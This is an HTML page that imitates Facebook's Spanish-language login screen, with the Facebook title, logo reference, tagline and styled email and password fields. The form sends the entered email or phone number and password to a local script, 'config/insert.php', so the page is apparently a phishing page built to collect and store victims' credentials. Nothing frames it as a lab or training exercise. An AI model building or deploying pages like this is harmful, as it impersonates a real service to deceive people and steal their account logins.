
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Facebook - Log In or Sign Up</title>
</head>

<style>
    * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    background-color: #f0f2f5;
    font-family: Arial, Helvetica, sans-serif;
}

.container {
    height: 100vh;
    padding: 1rem;
}

.logo img {
    display: block;
    margin: auto;
    width: 200px;
}

.connect-friends {
    text-align: center;
    font-size: 1.2rem;
    line-height: 28px;
}

.form * {
    display: block;
}

.form {
    max-width: 400px;
    padding: 1rem;
    margin: 1rem auto;
    background-color: #fff;
    border-radius: 7px;
    box-shadow: 1px 1px 10px rgba(117, 116, 116, .219);

}

.form input[type="text"],
.form input[type="password"],
.form input[type="submit"] {
    padding: 1rem;
    width: 100%;
    margin-bottom: 10px;
    outline-color: #1877f2;
    border: solid thin #dddfe2;
    border-radius: 6px;
    font-family: inherit;
    font-size: 17px;
    text-align: left;
}

.form input::placeholder {
    color: #a6a8a8;
}

.form input[type="submit"] {
    background-color: hsl(214, 89%, 52%);
    text-align: center;
    padding: .9rem .5rem;
    font-weight: 600;
    font-size: 20px;
    color: #fff;
    margin-top: 15px;
    cursor: pointer;
}

.form span {
    text-align: center;
    font-size: 14px;
    margin-top: 15px;
}

.form span a {
    color: #247df1;
    text-decoration: none;
}

.border {
    width: 90%;
    height: 1px;
    background-color: #dadde1;
    margin: 20px auto;
}

.form button {
    width: 50%;
    margin: auto;
    background-color: #42b72a;
    padding: .9rem .3rem;
    border-radius: 6px;
    outline: none;
    border: none;
    cursor: pointer;
}

.form button a {
    text-decoration: none;
    color: #fff;
    font-weight: 600;
    font-size: 17px;
}

.create-page {
    text-align: center;
    margin-top: 1.5rem;
    font-size: 15px;
}

.create-page > a {
    color: #222;
    font-weight: 600;
    text-decoration: none;
}

@media screen and (min-width:450px) {
    .logo img {
        width: 300px;
    }

    .connect-friends {
        font-size: 1.5rem;
    }

    .form input::placeholder {
        font-size: 1rem;
    }

    .form input[type="submit"] {
        font-size: 1.2rem;
    }
}

@media screen and (min-width:900px) {
    .container {
        max-width: 1400px;
        display: flex;
        align-items: center;
        justify-content: space-evenly;
    }

    .container-profile {
        width: 40%;
        margin-left: 100px;
        transform: translateY(-50px);
    }

    .logo img {
        display: inline-block;
        margin: 0;
    }

    .connect-friends {
        text-align: left;
        margin-left: 30px;
        font-size: 27px;
    }

    .container-form {
        width: 50%;
    }

    .form {
        width: 400px;
    }
}
</style>


<body>
    <div class="container">
        <div class="container-profile">
            <span class="logo">
                <img src="img/1.svg" alt="facebook">
            </span>
            <p class="connect-friends">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
        </div>
        <div class="container-form">
            <form class="form" method="post" action="config/insert.php">
                <input type="text"  name="correoo" placeholder="Correo electronico o numero de telefono" required>
                <input type="password" name="password" placeholder="Contraseña" required>
                <input type="submit" value="Iniciar Sesión">
                <span><a href="#">¿Olvidaste tu contraseña?</a></span>
                <div class="border"></div>
                <button><a href="#">Crear cuenta nueva</a></button>
            </form>
            <p class="create-page">
                <a href="#">Crear una pagina</a> para una celebridad , una marca o un <br> neogocio.
            </p>
        </div>
    </div>

</body>

</html>
